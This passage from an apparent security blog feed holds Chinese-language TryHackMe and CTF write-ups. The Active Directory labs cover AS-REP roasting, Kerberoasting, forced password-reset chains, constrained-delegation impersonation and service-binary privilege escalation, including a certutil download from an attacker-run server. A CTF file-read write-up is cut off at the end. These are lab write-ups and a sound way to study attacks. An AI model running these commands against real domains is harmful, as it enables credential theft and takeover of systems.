alt="image-20241025150408916"></p><p>发现有三个能够<code>AS-REP</code>攻击的用户</p><ul><li><code>ERNESTO_SILVA@THM.CORP</code></li><li><code>TABATHA_BRITT@THM.CORP</code></li><li><code>LEANN_LONG@THM.CORP</code></li></ul><p>将用户名保存到<code>users</code>文件</p><p>使用<code>GetNPUsers.py</code>请求用户的<code>TGT</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py thm.corp/ -usersfile <span class="built_in">users</span> -dc-ip 10.10.219.65</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025151452294-1718262734.png" alt="image-20241025151428929"></p><p>分别使用<code>john</code>爆破</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025152715817-367967576.png" alt="image-20241025152652439"></p><p>最终发现只有<code>TABATHA_BRITT</code>用户成功爆破，密码是<code>marlboro(1985)</code></p><p>再对该用户进行信息搜集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u TABATHA_BRITT -p <span class="string">&#x27;marlboro(1985)&#x27;</span> -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025161327821-1280956437.png" alt="image-20241025161304577">将收集的信息使用<code>Bloodhound</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162900833-2005768447.png" alt="image-20241025162837120"></p><p>找到利用链，我们想要到达<code>DARLA_WINTERS</code>，就是从<code>TABATHA_BRITT</code>到<code>SHAWMA_BRAY</code>的<code>GenericAll</code>，利用<code>ForceChangePassword</code>从<code>SHAWMA_BRAY</code>到<code>CRUZZ_HALL</code>，最后利用<code>GenericWrite</code>从<code>CRUZ_HALL</code>到<code>DARLA_WINTERS</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162314922-442943433.png" alt="image-20241025162252026"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162215576-292168178.png" alt="image-20241025162152712"></p><p>我们发现可以通过<code>RPC</code>利用<code>GenericAll</code>更改用户的密码，对于<code>ForceChangePassword</code>和<code>GenericWrite</code>同样可以适用</p><p>我们使用<code>TABATHA_BRITT</code>用户来操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;SHAWNA_BRAY&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;thm.corp&quot;</span>/<span class="string">&quot;TABATHA_BRITT&quot;</span>%<span class="string">&quot;marlboro(1985)&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br><span class="line"></span><br><span class="line">net rpc password <span class="string">&quot;CRUZ_HALL&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;THM.CORP&quot;</span>/<span class="string">&quot;SHAWNA_BRAY&quot;</span>%<span class="string">&quot;Aa123456!&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br><span class="line"></span><br><span class="line">net rpc password <span class="string">&quot;DARLA_WINTERS&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;THM.CORP&quot;</span>/<span class="string">&quot;CRUZ_HALL&quot;</span>%<span class="string">&quot;Aa123456!&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025164851767-362787753.png" alt="image-20241025164828710"></p><p>使用<code>crackmapexec</code>验证一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.219.65 -u DARLA_WINTERS -p <span class="string">&#x27;Aa123456!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025165457028-896741427.png" alt="image-20241025165434092"></p><p>修改成功！再对<code>DARLA_WINTERS</code>信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u <span class="string">&#x27;DARLA_WINTERS&#x27;</span> -p <span class="string">&#x27;Aa123456!&#x27;</span> -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025172857716-1006065661.png" alt="image-20241025172834592"></p><p>发现<code>DARLA_WINTERS</code>用户可以通过<code>CIFS</code>服务进行委派攻击，我们就可以模拟域控上<code>CIFS</code>服务的管理员</p><h2 id="委派攻击">委派攻击</h2><p><code>Impacket</code> 的<code>getST</code>脚本将请求服务的<code>Ticket</code> 并将其保存为 <code>ccache</code>。如果帐户具有受限的委派权限，可以使用 <code>-impersonate</code> 标志代表其他用户请求票证。</p><p>使用 <code>impacket</code> 的<code>getST.py</code>获取票据</p><p>在请求票据之前，我们先输入下面这个命令。这个命令可以从指定的 NTP 服务器上获取准确的时间，并将系统时间调整到与之同步。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s haystack.thm.corp</span><br></pre></td></tr></table></figure><p>然后再开始获取票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn <span class="string">&quot;cifs/haystack.thm.corp&quot;</span> -dc-ip 10.10.219.65 -impersonate <span class="string">&quot;Administrator&quot;</span> <span class="string">&quot;thm.corp/DARLA_WINTERS:Aa123456!&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025175746257-1822396632.png" alt="image-20241025175722380"></p><p>使用<code>KRB5CCNAME</code>环境变量设置 <code>ccache</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache</span><br></pre></td></tr></table></figure><p>再使用<code>wmiexec.py</code>登录<code>Administrator</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -k -no-pass Administrator@haystack.thm.corp</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025181710304-1116480087.png" alt="image-20241025181646460"></p><p>成功获得<code>Administrator</code>的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025181908376-2067529138.png" alt="image-20241025181845059"></p><p>在<code>Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Reset</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
  </entry>
  
  <entry>
    <title>THM-Enterprise</title>
    <link href="https://ya1orin.github.io/posts/f6320aec.html"/>
    <id>https://ya1orin.github.io/posts/f6320aec.html</id>
    <published>2024-10-23T07:42:46.000Z</published>
    <updated>2024-11-15T09:36:21.010Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.76.81</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.184.113</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 15:44 CST</span><br><span class="line">Warning: 10.10.184.113 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.184.113</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 59956 closed tcp ports (reset), 5552 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-23 07:44:58Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: LAB-ENTERPRISE</span><br><span class="line">|   NetBIOS_Domain_Name: LAB-ENTERPRISE</span><br><span class="line">|   NetBIOS_Computer_Name: LAB-DC</span><br><span class="line">|   DNS_Domain_Name: LAB.ENTERPRISE.THM</span><br><span class="line">|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="line">|   DNS_Tree_Name: ENTERPRISE.THM</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-23T07:46:13+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="line">| Not valid before: 2024-10-22T07:43:23</span><br><span class="line">|_Not valid after:  2025-04-23T07:43:23</span><br><span class="line">|_ssl-date: 2024-10-23T07:46:26+00:00; -1s from scanner time.</span><br><span class="line">5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">7990/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Log in to continue - Log in with Atlassian account</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49679/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49707/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49713/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=10/23%OT=53%CT=1%CU=31414%PV=Y%DS=2%DC=T%G=Y%TM=671</span><br><span class="line">OS:8A9DA%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=RD%II=I%SS=</span><br><span class="line">OS:S%TS=U)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=102%GCD=</span><br><span class="line">OS:1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=U)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%I</span><br><span class="line">OS:I=I%SS=S%TS=U)OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O</span><br><span class="line">OS:5=M509NW8NNS%O6=M509NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=F</span><br><span class="line">OS:F70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A</span><br><span class="line">OS:=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=</span><br><span class="line">OS:Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R</span><br><span class="line">OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=</span><br><span class="line">OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U</span><br><span class="line">OS:1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF</span><br><span class="line">OS:I=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1s, deviation: 0s, median: -1s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-23T07:46:15</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 199/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   359.39 ms 10.14.0.1</span><br><span class="line">2   360.71 ms 10.10.184.113</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 144.50 seconds</span><br></pre></td></tr></table></figure><p>不难看出这是一台域控机器，开放了若干端口，域名为<code>LAB.ENTERPRISE.THM</code>，将其添加到<code>/etc/hosts</code>文件中</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023164304313-1442381621.png" alt="image-20241023164242012"></p><h2 id="SMB">SMB</h2><p>先简单探测下smb服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.184.113</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155144317-1847528457.png" alt="image-20241023155122981"></p><p>发现一些共享目录，尝试匿名登陆访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.184.113/Docs</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155531326-846039650.png" alt="image-20241023155511089"></p><p>发现两个文件<code>get</code>下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.184.113/Users</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155623661-1766656713.png" alt="image-20241023155603137"></p><p>把<code>desktop.ini</code>下载下来，同时在<code>Users</code>目录中，找到一些用户名</p><p>将用户名保存下来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155922742-1623262837.png" alt="image-20241023155901976"></p><p>在<code>Default</code>目录中找到些文件，查看一下之前下载的文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160456960-1428865174.png" alt="image-20241023160434574"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160539318-945036663.png" alt="image-20241023160516110"></p><p>发现这两个文件需要密码才能查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160627583-292902303.png" alt="image-20241023160602672"></p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160131115-1178226363.png" alt="image-20241023160110776"></p><p>默认页面没什么信息，扫描一下后台</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160734235-742745560.png" alt="image-20241023160710469"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160820658-791344310.png" alt="image-20241023160753616"></p><p>没啥用</p><h2 id="7990端口">7990端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162220892-1397336076.png" alt="image-20241023162156550"></p><p>这是一个<code>Atlassian</code>并且发现内容是<code>Enterprise-THM</code>，正在迁移至github，我们上去google搜索一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162740885-2011563018.png" alt="image-20241023162718049"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162838024-1090127372.png" alt="image-20241023162813746"></p><p>注意到有个用户<code>Nik-enterprise-dev</code>，里面有一个库<code>mgmtScript.ps1</code>，库里面还有个ps1文件<code>mgmtScript.ps1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023163037619-1307610051.png" alt="image-20241023163010726"></p><p>查看一下历史记录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023163133624-1566744799.png" alt="image-20241023163105667"></p><p>发现了他的用户名及密码<code>nik:ToastyBoi!</code></p><h2 id="rpc">rpc</h2><p>有了一组用户凭据，尝试探测一下<code>rpc</code>，枚举一下用户</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient lab.enterprise.thm -U nik --password=<span class="string">&quot;ToastyBoi!&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023190844546-934835508.png" alt="image-20241023190823732"></p><p>找到很多域用户，将其保存到<code>users</code>文件中，方便后续利用</p><h1>rdp登录bitbucket</h1><p>有了一组凭据和用户名列表就可以尝试<code>AS-REP Roasting</code>，检查一下域中用户是否有用户禁用了预身份验证，如果有的话，我们就可以请求<code>TGT</code>密钥，就可以尝试离线破解密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py lab.enterprise.thm/ -usersfile <span class="built_in">users</span> -dc-ip 10.10.184.113</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023194833249-196889267.png" alt="image-20241023194812832"></p><p>接下来查看是否有用户设置了<code>SPN</code>，如果有的话，我们可以请求<code>TGS</code>密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023185802387-322860292.png" alt="image-20241023185741834"></p><p>发现<code>bitbucket</code>用户设置了<code>SPN</code>，我们请求<code>TGS</code>并尝试破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023185920000-1248219664.png" alt="image-20241023185859159"></p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023195207909-243147148.png" alt="image-20241023195147299"></p><p>爆破出密码<code>littleredbucket</code></p><p>rdp尝试登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023203011100-308824680.png" alt="image-20241023202950998"></p><p>在桌面找到<code>user.txt</code></p><h1>提权至root</h1><p>使用<code>PowerUp.ps1</code>来分析可能提升权限的漏洞，将文件传到靶机上</p><p>攻击机启动python服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023210727187-1693192503.png" alt="image-20241023210705120"></p><p>从受害者机器上，我们使用<code>certutil</code>从 <code>Powershell</code> 获取可执行文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">8000</span>/PowerUp.ps1 PowerUp.ps1</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024160000887-1751636811.png" alt="image-20241024155939035"></p><p>运行<code>PowerUp.ps1</code>后执行<code>Invoke-AllChecks</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024161255216-268400229.png" alt="image-20241024161233438"></p><p>我们发现<code>zerotieroneservice</code>是作为<code>SYSTEM</code>运行的，并且可以重启该服务</p><p>使用下面的命令滥用此功能，将当前用户<code>bitbucket</code>添加到管理员组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Install-ServiceBinary</span> <span class="literal">-Name</span> <span class="string">&quot;zerotieroneservice&quot;</span> <span class="literal">-Command</span> <span class="string">&quot;net localgroup Administrators lab.enterprise.thm\bitbucket /add&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162013069-1833540896.png" alt="image-20241024161951199"></p><p>执行后，我们重启<code>zerotieroneservice</code>服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop zerotieroneservice</span><br><span class="line">sc.exe <span class="built_in">start</span> zerotieroneservice</span><br></pre></td></tr></table></figure><p>查看一下当前用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user bitbucket</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162313666-1753984328.png" alt="image-20241024162251879"></p><p>发现我们当前属于<code>Administrator</code>组</p><p>使用<code>evil-winrm</code>登录（使用evil-winrm的原因纯粹是因为我rdp登录卡的要死）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.76.81 -u bitbucket -p littleredbucket</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162856683-1105115210.png" alt="image-20241024162834485"></p><p>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Enterprise</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Active Directory" scheme="https://ya1orin.github.io/tags/Active-Directory/"/>
    
  </entry>
  
  <entry>
    <title>强网拟态 2024</title>
    <link href="https://ya1orin.github.io/posts/c9a637a4.html"/>
    <id>https://ya1orin.github.io/posts/c9a637a4.html</id>
    <published>2024-10-21T01:23:52.000Z</published>
    <updated>2024-10-21T05:11:47.768Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>Web</h1><h2 id="capoo-一血">capoo (一血)</h2><p>爽喽</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093643112-333016867.png" alt="image-20241019162216319"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093709026-2029109064.png" alt="image-20241019151935942"></p><p>f12发<img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093741131-1763474644.png" alt="image-20241019152114885">现读的图片，感觉应该能任意文件读取，读一下<code>/etc/passwd</code></p><p>发现能读，再看一下环境变量<code>/proc/1/environ</code>，没有</p><p>再看一下<code>/proc/1/cmdline</code>，发现存在<code>/bin/sh/docker-entrypoint.sh</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093821659-1694154678.png" alt="image-20241019152243867"></p><p><a href="http://xn--start-fg1hrct19aluzk82i.sh">再尝试一下start.sh</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093836336-503712739.png" alt="image-20241019152349796"></p><p>找到flag名称，直接读就能出flag</p><h2 id="ez-picker">ez_picker</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 